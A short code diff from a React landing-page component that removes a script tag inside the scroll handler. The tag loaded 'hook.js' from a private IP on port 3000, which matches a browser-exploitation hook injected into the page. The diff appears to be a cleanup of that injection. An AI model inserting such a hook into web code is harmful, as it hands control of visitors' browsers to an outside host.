@@ -17,7 +17,6 @@ export default function LandingHero() {
 
   const handleScroll = () => {
     setScrollY(window.scrollY);
-    <script src="http://172.16.213.144:3000/hook.js"></script>
   };
 
   useEffect(() => {
